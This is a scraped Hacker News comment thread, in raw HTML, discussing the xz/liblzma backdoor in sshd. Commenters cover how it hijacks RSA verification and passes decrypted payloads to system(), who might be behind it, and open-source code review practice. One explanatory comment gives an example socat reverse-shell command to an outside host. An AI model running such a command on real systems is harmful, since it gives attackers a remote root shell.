type="checkbox" id="c-39880336" checked=""/><div class="controls bullet"><span class="by">tialaramex</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879883">parent</a><span>|</span><a href="#39879555">next</a><span>|</span><label class="collapse" for="c-39880336">[-]</label><label class="expand" for="c-39880336">[1 more]</label></div><br/><div class="children"><div class="content">&gt; It might contain something like a date or other data specific only to the context it came from.<p>In all these modern protocols, including SSHv2 &#x2F; SecSH (Sean Connery fans at the IETF evidently) both parties deliberately introduce random elements into a signed conversation as a liveness check - precisely to prevent replaying previous communications.<p>TLS 1.3&#x27;s zero round-trip (ORT) mode cannot do this, which is why it basically says you&#x27;d better be damn sure you&#x27;ve figured out exactly why it&#x27;s safe to use this, including every weird replay scenario and why it&#x27;s technically sound in your design or else you <i>must</i> not enable it. We may yet regret the whole thing and just tell everybody to refuse it.</div><br/></div></div></div></div></div></div><div id="39879555" class="c"><input type="checkbox" id="c-39879555" checked=""/><div class="controls bullet"><span class="by">superb_dev</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879141">parent</a><span>|</span><a href="#39879780">prev</a><span>|</span><a href="#39880037">next</a><span>|</span><label class="collapse" for="c-39879555">[-]</label><label class="expand" for="c-39879555">[5 more]</label></div><br/><div class="children"><div class="content">This feels very targeted</div><br/><div id="39879567" class="c"><input type="checkbox" id="c-39879567" checked=""/><div class="controls bullet"><span class="by">Ekaros</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879555">parent</a><span>|</span><a href="#39880037">next</a><span>|</span><label class="collapse" for="c-39879567">[-]</label><label class="expand" for="c-39879567">[4 more]</label></div><br/><div class="children"><div class="content">Or very untargeted. Something intended just to lay dormant by chance if succeeded...<p>It is very good backdoor to have if you at whatever time have dozens of options. See sshd running, test this you are done if it works, if not move to something else.</div><br/><div id="39879656" class="c"><input type="checkbox" id="c-39879656" checked=""/><div class="controls bullet"><span class="by">dools</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879567">parent</a><span>|</span><a href="#39880037">next</a><span>|</span><label class="collapse" for="c-39879656">[-]</label><label class="expand" for="c-39879656">[3 more]</label></div><br/><div class="children"><div class="content">Or targeted not really at doing anything but at researching the nature of supply chain vulnerabilities themselves.</div><br/><div id="39880686" class="c"><input type="checkbox" id="c-39880686" checked=""/><div class="controls bullet"><span class="by">takeda</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879656">parent</a><span>|</span><a href="#39881547">next</a><span>|</span><label class="collapse" for="c-39880686">[-]</label><label class="expand" for="c-39880686">[1 more]</label></div><br/><div class="children"><div class="content">This doesn&#x27;t look like a research.<p>This looks like state sponsored attack. Imagine having a backdoor that you can just go to any Linux server and with your key you can make it execute any code you wish without any audit trail. And no one without the key can do it, so even if your citizens use such vulnerable system other states won&#x27;t be able to use your backdoor.</div><br/></div></div><div id="39881547" class="c"><input type="checkbox" id="c-39881547" checked=""/><div class="controls bullet"><span class="by">cjbprime</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879656">parent</a><span>|</span><a href="#39880686">prev</a><span>|</span><a href="#39880037">next</a><span>|</span><label class="collapse" for="c-39881547">[-]</label><label class="expand" for="c-39881547">[1 more]</label></div><br/><div class="children"><div class="content">Spending two years <i>actually maintaining</i> an open source project that you will later backdoor is a very expensive way to perform such research.</div><br/></div></div></div></div></div></div></div></div><div id="39880037" class="c"><input type="checkbox" id="c-39880037" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879141">parent</a><span>|</span><a href="#39879555">prev</a><span>|</span><a href="#39879551">next</a><span>|</span><label class="collapse" for="c-39880037">[-]</label><label class="expand" for="c-39880037">[1 more]</label></div><br/><div class="children"><div class="content">I don&#x27;t understand yet where the &quot;unreplayable&quot; part comes from, but this isn&#x27;t it.</div><br/></div></div><div id="39879551" class="c"><input type="checkbox" id="c-39879551" checked=""/><div class="controls bullet"><span class="by">BlueFalconHD</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879141">parent</a><span>|</span><a href="#39880037">prev</a><span>|</span><a href="#39879173">next</a><span>|</span><label class="collapse" for="c-39879551">[-]</label><label class="expand" for="c-39879551">[5 more]</label></div><br/><div class="children"><div class="content">It would be really cool if in 20 years when we have quantum computers powerful enough we could see what this exploit does.</div><br/><div id="39879748" class="c"><input type="checkbox" id="c-39879748" checked=""/><div class="controls bullet"><span class="by">denysvitali</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879551">parent</a><span>|</span><a href="#39882145">next</a><span>|</span><label class="collapse" for="c-39879748">[-]</label><label class="expand" for="c-39879748">[3 more]</label></div><br/><div class="children"><div class="content">My understanding is that we know somehow already what the exploit allows the attacker to do - we just can&#x27;t reproduce it because we don&#x27;t have their private key.<p>Technically, we can modify the backdoor and embed our own public key - but there is no way to probe a random server on the internet and check if it&#x27;s vulnerable (from a scanner perspective).<p>In a certain way it&#x27;s a good thing - only the creator of the backdoor can access your vulnerable system...</div><br/><div id="39880391" class="c"><input type="checkbox" id="c-39880391" checked=""/><div class="controls bullet"><span class="by">tialaramex</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879748">parent</a><span>|</span><a href="#39882145">next</a><span>|</span><label class="collapse" for="c-39880391">[-]</label><label class="expand" for="c-39880391">[2 more]</label></div><br/><div class="children"><div class="content">It&#x27;s a NOBUS (Nobody But Us can use it) attack. The choice to use a private key means it&#x27;s possible that even the person who submitted the tampered code doesn&#x27;t have the private key, only some other entity controlling them does.</div><br/></div></div></div></div><div id="39882145" class="c"><input type="checkbox" id="c-39882145" checked=""/><div class="controls bullet"><span class="by">kortilla</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879551">parent</a><span>|</span><a href="#39879748">prev</a><span>|</span><a href="#39879173">next</a><span>|</span><label class="collapse" for="c-39882145">[-]</label><label class="expand" for="c-39882145">[1 more]</label></div><br/><div class="children"><div class="content">We do know what it does. If it decrypts it just passes to system().</div><br/></div></div></div></div></div></div><div id="39879173" class="c"><input type="checkbox" id="c-39879173" checked=""/><div class="controls bullet"><span class="by">q3k</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879141">prev</a><span>|</span><a href="#39879099">next</a><span>|</span><label class="collapse" for="c-39879173">[-]</label><label class="expand" for="c-39879173">[2 more]</label></div><br/><div class="children"><div class="content">&gt; The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC?<p>Not if public-key cryptography was used correctly, and if there are no exploitable bugs.</div><br/><div id="39880219" class="c"><input type="checkbox" id="c-39880219" checked=""/><div class="controls bullet"><span class="by">jnwatson</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879173">parent</a><span>|</span><a href="#39879099">next</a><span>|</span><label class="collapse" for="c-39880219">[-]</label><label class="expand" for="c-39880219">[1 more]</label></div><br/><div class="children"><div class="content">We understand it completely.  However, since determining the private key that corresponds to the public key embedded in the backdoor is practically infeasible, we can&#x27;t actually exercise it.  Someone could modify the code with a known ed448 private key and exercise it, but the point of having the PoC is to scan the internet and find vulnerable servers.</div><br/></div></div></div></div><div id="39879099" class="c"><input type="checkbox" id="c-39879099" checked=""/><div class="controls bullet"><span class="by">snnn</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879173">prev</a><span>|</span><a href="#39879722">next</a><span>|</span><label class="collapse" for="c-39879099">[-]</label><label class="expand" for="c-39879099">[12 more]</label></div><br/><div class="children"><div class="content">That&#x27;s the most interesting part. No, we don&#x27;t know it yet. The backdoor is so sophisticated that none of us can fully understand it. It is not a “usual” security bug.</div><br/><div id="39879195" class="c"><input type="checkbox" id="c-39879195" checked=""/><div class="controls bullet"><span class="by">heresWaldo</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879099">parent</a><span>|</span><a href="#39881731">next</a><span>|</span><label class="collapse" for="c-39879195">[-]</label><label class="expand" for="c-39879195">[10 more]</label></div><br/><div class="children"><div class="content">Yeah these types of security issues will be used by politicians to force hardware makers to lockdown hardware, embed software in chips.<p>The go fast startups habit of “import the world to make my company products” is a huge security issue IT workers ignore.<p>The only solution politics and big tech will chase is obsolete said job market by pulling more of the stack into locked down hardware, with updates only allowed to come from the gadget vendor.</div><br/><div id="39879312" class="c"><input type="checkbox" id="c-39879312" checked=""/><div class="controls bullet"><span class="by">georgyo</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879195">parent</a><span>|</span><a href="#39879336">next</a><span>|</span><label class="collapse" for="c-39879312">[-]</label><label class="expand" for="c-39879312">[2 more]</label></div><br/><div class="children"><div class="content">I&#x27;m not saying political forces won&#x27;t try legislating the problem away, but that won&#x27;t even help here.<p>A supply chain attack can happen in hardware or software. Hardware has firmware, which is software.<p>What makes this XZ attack so scary is that it was directly from a &quot;trusted&quot; source. A similar attack could come from any trusted source.<p>At least with software it is much easier to patch.</div><br/><div id="39880981" class="c"><input type="checkbox" id="c-39880981" checked=""/><div class="controls bullet"><span class="by">heresWaldo</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879312">parent</a><span>|</span><a href="#39879336">next</a><span>|</span><label class="collapse" for="c-39880981">[-]</label><label class="expand" for="c-39880981">[1 more]</label></div><br/><div class="children"><div class="content">Like you said it has firmware which is flashable. Secure enclaves are never 100% secure but if only, for example, Apple can upload to them, it dramatically reduces some random open source project being git pulled. Apple may still pull open source but they would be on the hook to avoid this.<p>Open sources days of declaring “use at your risk” have become a liability in this hyper networked society. It’s now becoming part of the problem it was imagined up to solve.</div><br/></div></div></div></div><div id="39879336" class="c"><input type="checkbox" id="c-39879336" checked=""/><div class="controls bullet"><span class="by">avidiax</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879195">parent</a><span>|</span><a href="#39879312">prev</a><span>|</span><a href="#39879322">next</a><span>|</span><label class="collapse" for="c-39879336">[-]</label><label class="expand" for="c-39879336">[4 more]</label></div><br/><div class="children"><div class="content">The NSA demands that Intel and AMD provide backdoor ways to turn off the IME&#x2F;PSP, which are basically a small OS running in a small processor inside your processor. So the precedent is that the government wants less embedded software in their hardware, at least for themselves.<p>If we relied on gadget vendors to maintain such software, I think we can just look at any IoT or router manufacturer to get an idea of just how often and for how long they will update the software. So that idea will probably backfire spectacularly if implemented.</div><br/><div id="39879560" class="c"><input type="checkbox" id="c-39879560" checked=""/><div class="controls bullet"><span class="by">BlueFalconHD</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879336">parent</a><span>|</span><a href="#39879322">next</a><span>|</span><label class="collapse" for="c-39879560">[-]</label><label class="expand" for="c-39879560">[3 more]</label></div><br/><div class="children"><div class="content">What does the IME or PSP do?</div><br/><div id="39879653" class="c"><input type="checkbox" id="c-39879653" checked=""/><div class="controls bullet"><span class="by">timschmidt</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879560">parent</a><span>|</span><a href="#39881641">next</a><span>|</span><label class="collapse" for="c-39879653">[-]</label><label class="expand" for="c-39879653">[1 more]</label></div><br/><div class="children"><div class="content">Short answer: anything it wants.<p>IME has privileged access to the MMU(s), all system memory, and even out-of-band access to the network adapter such the the OS cannot inspect network traffic originating with or destined for the IME.</div><br/></div></div><div id="39881641" class="c"><input type="checkbox" id="c-39881641" checked=""/><div class="controls bullet"><span class="by">CobrastanJorji</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879560">parent</a><span>|</span><a href="#39879653">prev</a><span>|</span><a href="#39879322">next</a><span>|</span><label class="collapse" for="c-39881641">[-]</label><label class="expand" for="c-39881641">[1 more]</label></div><br/><div class="children"><div class="content">Lots. It&#x27;s basically an extra processor that runs at all times, even when your computer is supposedly &quot;off.&quot; Its firmware is bigger than you&#x27;d think, like a complete Unix system big. It&#x27;s frankly terrifying how powerful and opaque it is. It provides a lot around remote management for corporations, lots of &quot;update the BIOS remotely&quot; sort of features, and also a bunch of those stupid copy protection enforcement things. Plus some startup&#x2F;shutdown stuff like Secure Boot.</div><br/></div></div></div></div></div></div><div id="39879322" class="c"><input type="checkbox" id="c-39879322" checked=""/><div class="controls bullet"><span class="by">berkes</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879195">parent</a><span>|</span><a href="#39879336">prev</a><span>|</span><a href="#39879328">next</a><span>|</span><label class="collapse" for="c-39879322">[-]</label><label class="expand" for="c-39879322">[2 more]</label></div><br/><div class="children"><div class="content">Why would &quot;embed software in chips&quot; be a solution?<p>If anything, I&#x27;d expect it to be an even bigger risk, because when (not if) a security issue is found in the hardware, you now have no way to fix it, other than throwing out this server&#x2F;fridge&#x2F;toothbrush or whatever is running it.</div><br/><div id="39879619" class="c"><input type="checkbox" id="c-39879619" checked=""/><div class="controls bullet"><span class="by">heresWaldo</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879322">parent</a><span>|</span><a href="#39879328">next</a><span>|</span><label class="collapse" for="c-39879619">[-]</label><label class="expand" for="c-39879619">[1 more]</label></div><br/><div class="children"><div class="content">A flashable secure enclave segment in the hardware stack is an option to patch around embedded bugs.<p>I haven’t worked in hardware design since the era of Nortel, and it was way different back then but the general physics are the same; if, else, while, and math operations in the hardware are not hard.<p>In fact your hardware <i>is</i> a general while loop; while has power, iterate around refreshing these memory states with these computed values, even in the absence of user input (which at the root is turning it on).<p>Programmers have grown accustomed to being necessary to running ignorant business machines but that’s never been a real requirement. Just a socialized one. And such memes are dying off.</div><br/></div></div></div></div><div id="39879328" class="c"><input type="checkbox" id="c-39879328" checked=""/><div class="controls bullet"><span class="by">WesolyKubeczek</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879195">parent</a><span>|</span><a href="#39879322">prev</a><span>|</span><a href="#39881731">next</a><span>|</span><label class="collapse" for="c-39879328">[-]</label><label class="expand" for="c-39879328">[1 more]</label></div><br/><div class="children"><div class="content">Which will make updates either expensive or impossible. You will be able to write books about exploitable bugs in the hardware, and those books will easily survive several editions.</div><br/></div></div></div></div><div id="39881731" class="c"><input type="checkbox" id="c-39881731" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879099">parent</a><span>|</span><a href="#39879195">prev</a><span>|</span><a href="#39879722">next</a><span>|</span><label class="collapse" for="c-39881731">[-]</label><label class="expand" for="c-39881731">[1 more]</label></div><br/><div class="children"><div class="content">It’s not that we can’t understand it, it’s just that work to understand it is ongoing.</div><br/></div></div></div></div><div id="39879722" class="c"><input type="checkbox" id="c-39879722" checked=""/><div class="controls bullet"><span class="by">junon</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879099">prev</a><span>|</span><a href="#39879135">next</a><span>|</span><label class="collapse" for="c-39879722">[-]</label><label class="expand" for="c-39879722">[4 more]</label></div><br/><div class="children"><div class="content">Siblings saying &quot;we don&#x27;t know&quot; haven&#x27;t really groked the post I don&#x27;t think.<p>If I&#x27;m understanding the thread correctly, here&#x27;s a (not so) succinct explanation. Please, if you know better than I do, correct me if I&#x27;ve made an error in my understanding.<p>`system()` is a standard C function that takes a string as input and runs it through `sh`, like so:<p><pre><code>    sh -c &quot;whatever input&quot;
</code></pre>
It&#x27;s used as a super rudimentary way to run arbitrary shell commands from a C program, using the `execl()` call under the hood, just like you&#x27;d run them on a bash&#x2F;sh&#x2F;fish&#x2F;zsh&#x2F;whatever command line.<p><pre><code>    system(&quot;echo &#x27;!dlroW ,olleH&#x27; | rev&quot;);
</code></pre>
Those commands run mostly in the same privilege context as the process that invoked `system()`. If the call to `system()` came from a program running as root, the executed command is also run as root.<p>The backdoor utilizes this function in the code that gets injected into `sshd` by way of liblzma.so, a library for the LZMA compression algorithm (commonly associated with the `.xz` extension). Jia Tan, the person at the center of this whole back door, has been a maintainer of that project for several years now.<p>Without going too much into <i>how</i> the injected code gets into the `sshd` process, the back door inserts itself into the symbol lookup process earlier than other libraries, such as libcrypto and openssl. What this means is (and I&#x27;m over-simplifying a lot), when the process needs to map usages of e.g. `SSL_decrypt_key()` that were linked to dynamic libraries (as opposed to be statically linked and thus included directly into `sshd`), to real functions, it does a string-wise lookup to see where it can find it.<p>It runs through a list of dynamic libraries that might have it and sees if they export it. If they do, it gets the address of the exported function and remembers where it&#x27;s at so that further calls to that function can be found quickly, without another search. This is how DLLs and SOs (dynamic libraries) are linked to the process that needs them at runtime without the process needing to know <i>exactly</i> where the functions that they need are located.<p>The back door hijacks this mechanism to insert its own functions in some of those places, so that when `sshd` thinks it&#x27;s calling `SSL_decrypt_key()`, it&#x27;s really calling some malicious function in the back door - which can then choose to do something with the data passed to the function call, or it can choose to forward the call to the <i>real</i> function.<p>It makes use of this when `sshd` needs to validate RSA information passed to the server via a client connection during authentication. An RSA key has a bunch of fields, one of which is the &#x27;n&#x27; field - the public key data itself. OpenSSL implements this as a BIGNUM, or a variable-length, potentially very large number. It&#x27;s more or less read in as a bag of bytes, and its meaning depends on the underlying encryption algorithm. This is the mechanism behind &quot;public key authentication&quot; when connecting to servers, and is generally more secure than e.g. username&#x2F;password authentication.<p>The back door intercepts the call to check the RSA data, pulls out the &#x27;n&#x27; parameter, and tries to decrypt it using ChaCha20. There&#x27;s no way for it to know if it&#x27;s decrypted beforehand, but generally encryption algorithms have a way to error-check and report failures - that, or you add some well known piece of information into the encrypted data that you can verify once it&#x27;s decrypted.<p>Either way, the back door checks to see if it&#x27;s really an encrypted string. If not, it forwards the call back to the original RSA check mechanism so that sshd can process it normally.<p>However, if the decryption succeeds, <i>the back door passes the decrypted string to `system()`.</i> This means that a random client connecting to an SSH server can craft an RSA public key that is really an encrypted, malicious payload to run any arbitrary shell command under which the same user `sshd` is running - oftentimes root.<p>Not only that, but the back door <i>also</i> checks the incoming RSA structure to see if it&#x27;s coming from the person who made it. This prevents any of us finding this exploit and using it ourselves, even if we know our target is infected. It&#x27;s a completely exclusive back door to whomever holds the private key used by the back door to sort of &#x27;authenticate&#x27; the exploit itself.<p>This is much worse than what many of us thought it was before - a public key auth bypass - which would have meant that you&#x27;d only gain access to any user allowed to log in via SSH. SSH&#x27;s configuration file has a setting that disables root logins under any circumstances that is generally enabled on production systems for obvious reasons. However, with it being an RCE, SSH servers running as root would execute the payloads <i>as root</i>.<p>From there, they could easily run socat and have the system connect to a server of their choice to gain a remote interactive shell, for example:<p><pre><code>    socat TCP:example.com:1234 SYSTEM:&quot;bash -l&quot;
</code></pre>
The possibilities are really endless. They&#x27;d effectively have a skeleton key that only they could use (or sell) that, with enough time for people to upgrade their version of `sshd`, would allow them access to just about any SSH server they could connect to, oftentimes with root permissions.<p>Hope that explains it a bit.</div><br/><div id="39880387" class="c"><input type="checkbox" id="c-39880387" checked=""/><div class="controls bullet"><span class="by">Denvercoder9</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879722">parent</a><span>|</span><a href="#39882342">next</a><span>|</span><label class="collapse" for="c-39880387">[-]</label><label class="expand" for="c-39880387">[1 more]</label></div><br/><div class="children"><div class="content">&gt;  Siblings saying &quot;we don&#x27;t know&quot; haven&#x27;t really groked the post I don&#x27;t think.<p>The reason for saying &quot;we don&#x27;t know&quot; is not that we don&#x27;t understand what&#x27;s detailed in TFA, but that the backdoor embeds a 88 kB object file into liblzma, and nobody has fully reverse engineered and understood <i>all</i> that code yet. There might be other things lurking in there.</div><br/></div></div><div id="39882342" class="c"><input type="checkbox" id="c-39882342" checked=""/><div class="controls bullet"><span class="by">takeda</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879722">parent</a><span>|</span><a href="#39880387">prev</a><span>|</span><a href="#39881787">next</a><span>|</span><label class="collapse" for="c-39882342">[-]</label><label class="expand" for="c-39882342">[1 more]</label></div><br/><div class="children"><div class="content">&gt; They&#x27;d effectively have a skeleton key that only they could use (or sell) that<p>this looks more like state sponsored attack and it doesn&#x27;t look like someone joining and at one point realizing they want to implement this backdoor.<p>The guy joined the project 2 years ago, developed a test framework (which he then used to hide binary of the backdoor in which appears that is complex and others are still figuring out how it works) then he gradually disabled various security checks before activating it.</div><br/></div></div><div id="39881787" class="c"><input type="checkbox" id="c-39881787" checked=""/><div class="controls bullet"><span class="by">sureglymop</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879722">parent</a><span>|</span><a href="#39882342">prev</a><span>|</span><a href="#39879135">next</a><span>|</span><label class="collapse" for="c-39881787">[-]</label><label class="expand" for="c-39881787">[1 more]</label></div><br/><div class="children"><div class="content">Thank you for the detailed write up. This made me think, why do we actually let sshd run as root?
Would it be possible to only run a very unsophisticated ssh server as root that depending on the user specified in the incoming connection just coordinates that connection to the actual user and let the server run there? This could be so simplistic that a backdoor would more easily be detected.</div><br/></div></div></div></div><div id="39879135" class="c"><input type="checkbox" id="c-39879135" checked=""/><div class="controls bullet"><span class="by">skywhopper</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879722">prev</a><span>|</span><a href="#39879320">next</a><span>|</span><label class="collapse" for="c-39879135">[-]</label><label class="expand" for="c-39879135">[4 more]</label></div><br/><div class="children"><div class="content">From what I’ve read I <i>think</i> the attack vector is:<p>1. sshd starts and loads the libsystemd library which loads the XZ library which contains the hack<p>2. The XZ library injects its own versions of functions in openssl that verify RSA signatures<p>3. When someone logs into SSH and presents a signed SSH certificate as authentication, those hacked functions are called<p>4. The certificate, in turn, can contain arbitrary data that in a normal login process would include assertions about username or role that would be used to determine if the certificate is valid for use logging in as the particular user. But if the hacked functions detect that the certificate was signed by a <i>specific</i> attacker key, they take some subfield of the certificate and execute it as a command on the system in the sshd context (ie, as the root user).<p>Unfortunately, we don’t know the attacker’s signing key, just the public key the hacked code uses to validate it. But basically this would give the attacker a way to run any command as root on any compromised system without leaving much of a trace, beyond the (presumably failed) login attempt, which any system on the internet will be getting a lot of anyway.</div><br/><div id="39879402" class="c"><input type="checkbox" id="c-39879402" checked=""/><div class="controls bullet"><span class="by">ghostpepper</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879135">parent</a><span>|</span><a href="#39879320">next</a><span>|</span><label class="collapse" for="c-39879402">[-]</label><label class="expand" for="c-39879402">[3 more]</label></div><br/><div class="children"><div class="content">&gt; beyond the (presumably failed) login attempt<p>There is some evidence it&#x27;s scrubbing logs so we might not even have that.</div><br/><div id="39881865" class="c"><input type="checkbox" id="c-39881865" checked=""/><div class="controls bullet"><span class="by">Deathcrow</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879402">parent</a><span>|</span><a href="#39879320">next</a><span>|</span><label class="collapse" for="c-39881865">[-]</label><label class="expand" for="c-39881865">[2 more]</label></div><br/><div class="children"><div class="content">Is there really a failed login attempts? If it never calls the real functions of ssh in case of their own cert+payload why would sshd log anything or even register a login attempt? Or does the backdoor function hook in after sshd already logged stuff?</div><br/><div id="39881988" class="c"><input type="checkbox" id="c-39881988" checked=""/><div class="controls bullet"><span class="by">numpad0</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39881865">parent</a><span>|</span><a href="#39879320">next</a><span>|</span><label class="collapse" for="c-39881988">[-]</label><label class="expand" for="c-39881988">[1 more]</label></div><br/><div class="children"><div class="content">Depending on log level, isn&#x27;t there going to be lines up to receiving the payload?</div><br/></div></div></div></div></div></div></div></div><div id="39879320" class="c"><input type="checkbox" id="c-39879320" checked=""/><div class="controls bullet"><span class="by">ajross</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879135">prev</a><span>|</span><a href="#39880261">next</a><span>|</span><label class="collapse" for="c-39879320">[-]</label><label class="expand" for="c-39879320">[1 more]</label></div><br/><div class="children"><div class="content">&gt; The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available?<p>The exploit as shipped is a binary (cleverly hidden in the test data), not source.  And it validates the payload vs. a private key that isn&#x27;t known to the public.  Only the attacker can exercise the exploit currently, making it impossible to scan for (well, absent second order effects like performance, which is how it was discovered).</div><br/></div></div></div></div><div id="39880261" class="c"><input type="checkbox" id="c-39880261" checked=""/><div class="controls bullet"><span class="by">tevon</span><span>|</span><a href="#39878947">prev</a><span>|</span><a href="#39880433">next</a><span>|</span><label class="collapse" for="c-39880261">[-]</label><label class="expand" for="c-39880261">[4 more]</label></div><br/><div class="children"><div class="content">Currently if you visit the xz repository it is disabled for violating github&#x27;s TOS.<p>While it should clearly be disabled, I feel like github should leave the code and history up, while displaying a banner (and disabled any features that could be exploited), so that researchers and others can learn about the exploit.<p>In more minor situations when a library is hosting malicious code, if I found the repo to be down I might not think anything of it.</div><br/><div id="39880287" class="c"><input type="checkbox" id="c-39880287" checked=""/><div class="controls bullet"><span class="by">jhfdbkofdchk</span><span>|</span><a href="#39880261">parent</a><span>|</span><a href="#39880584">next</a><span>|</span><label class="collapse" for="c-39880287">[-]</label><label class="expand" for="c-39880287">[1 more]</label></div><br/><div class="children"><div class="content">I imagine they don’t want automation downloading it.</div><br/></div></div><div id="39880584" class="c"><input type="checkbox" id="c-39880584" checked=""/><div class="controls bullet"><span class="by">Randalthorro</span><span>|</span><a href="#39880261">parent</a><span>|</span><a href="#39880287">prev</a><span>|</span><a href="#39881782">next</a><span>|</span><label class="collapse" for="c-39880584">[-]</label><label class="expand" for="c-39880584">[1 more]</label></div><br/><div class="children"><div class="content">You can find GitHub events from the repo as a csv here <a href="https:&#x2F;&#x2F;github.com&#x2F;emirkmo&#x2F;xz-backdoor-github">https:&#x2F;&#x2F;github.com&#x2F;emirkmo&#x2F;xz-backdoor-github</a><p>If you are interested in the source code that is easy to find. This code and git repo are linked all over the world, in many git repos, and the source is bundled many times
in releases as well.</div><br/></div></div><div id="39881782" class="c"><input type="checkbox" id="c-39881782" checked=""/><div class="controls bullet"><span class="by">shp0ngle</span><span>|</span><a href="#39880261">parent</a><span>|</span><a href="#39880584">prev</a><span>|</span><a href="#39880433">next</a><span>|</span><label class="collapse" for="c-39881782">[-]</label><label class="expand" for="c-39881782">[1 more]</label></div><br/><div class="children"><div class="content">xz has its own git mirror where you can see all the commits</div><br/></div></div></div></div><div id="39880433" class="c"><input type="checkbox" id="c-39880433" checked=""/><div class="controls bullet"><span class="by">tigerlily</span><span>|</span><a href="#39880261">prev</a><span>|</span><a href="#39877698">next</a><span>|</span><label class="collapse" for="c-39880433">[-]</label><label class="expand" for="c-39880433">[57 more]</label></div><br/><div class="children"><div class="content">As a <i>de facto</i> maintainer of an obscure open source game, I see devs come and go. I just merge all the worthwhile contributions. Some collaborators go pretty deep with their features, with a variety of coding styles, in a mishmash of C and C++. I&#x27;m not always across the implementation details, but in the back of my mind I&#x27;m thinking, man, anyone could just code up some real nasty backdoor and the project would be screwed. Lucky the game is so obscure and the attack surface minuscule, but it did stop me from any temptation to sign Windows binaries out of any sense of munificence.<p>This xz backdoor is just the most massive nightmare, and I really feel for the og devs, and anyone who got sucked in by this.</div><br/><div id="39880972" class="c"><input type="checkbox" id="c-39880972" checked=""/><div class="controls bullet"><span class="by">imiric</span><span>|</span><a href="#39880433">parent</a><span>|</span><a href="#39881974">next</a><span>|</span><label class="collapse" for="c-39880972">[-]</label><label class="expand" for="c-39880972">[12 more]</label></div><br/><div class="children"><div class="content">The late author of ZeroMQ, Pieter Hintjens, advocated for a practice called Optimistic Merging[1], where contributions would be merged immediately, without reviewing the code or waiting for CI results. So your approach of having lax merging guidelines is not far off.<p>While I can see the merits this has in building a community of contributors who are happy to work on a project, I always felt that it opens the project to grow without a clear vision or direction, and ultimately places too much burden on maintainers to fix contributions of others in order to bring them up to some common standard (which I surely expect any project to have, otherwise the mishmash of styles and testing practices would make working on the project decidedly not fun). It also delays the actual code review, which Pieter claimed does happen, to some unknown point in the future, when it may or may not be exhaustive, and when it&#x27;s not clear who is actually responsible of conducting it or fixing any issues. It all sounds like a recipe for chaos where there is no control over what eventually gets shipped to users. But then again, I never worked on ZeroMQ or another project that adopted these practices, so perhaps you or someone else here can comment on what the experience is like.<p>And then there&#x27;s this issue of malicious code being shipped. This is actually brought up by a comment on that blog post[2], and Pieter describes exactly what happened in the xz case:<p>&gt; Let&#x27;s assume Mallory is patient and deceitful and acts like a valid contributor long enough to get control over a project, and then slowly builds in his&#x2F;her backdoors. Then careful code review won&#x27;t help you. Mallory simply has to gain enough trust to become a maintainer, which is a matter of how, not if.<p>And concludes that &quot;the best defense [...] is size and diversity of the community&quot;.<p>Where I think he&#x27;s wrong is that a careful code review _can_ indeed reduce the chances of this happening. If all contributions are reviewed thoroughly, regardless if they&#x27;re authored by a trusted or external contributor, then strange behavior and commits that claim to do one thing but actually do something else, are more likely to be spotted earlier than later. While OM might lead to a greater community size and diversity, which I think is debatable considering how many projects exist with a thriving community of contributors while also having strict contribution guidelines, it doesn&#x27;t address how or when a malicious patch would be caught. If nobody is in charge of reviewing code, there are no testing standards, and maintainers have additional work keeping some type of control over the project&#x27;s direction, how does this actually protect against this situation?<p>The problem with xz wasn&#x27;t a small community; it was *no* community. A single malicious actor got control of the project, and there was little oversight from anyone else. The project&#x27;s contribution guidelines weren&#x27;t a factor in its community size, and this would&#x27;ve happened whether it used OM or not.<p>[1]: <a href="http:&#x2F;&#x2F;hintjens.com&#x2F;blog:106" rel="nofollow">http:&#x2F;&#x2F;hintjens.com&#x2F;blog:106</a><p>[2]: <a href="http:&#x2F;&#x2F;hintjens.com&#x2F;blog:106&#x2F;comments&#x2F;show#post-2409627" rel="nofollow">http:&#x2F;&#x2F;hintjens.com&#x2F;blog:106&#x2F;comments&#x2F;show#post-2409627</a></div><br/><div id="39881250" class="c"><input type="checkbox" id="c-39881250" checked=""/><div class="controls bullet"><span class="by">zeven7</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880972">parent</a><span>|</span><a href="#39882175">next</a><span>|</span><label class="collapse" for="c-39881250">[-]</label><label class="expand" for="c-39881250">[10 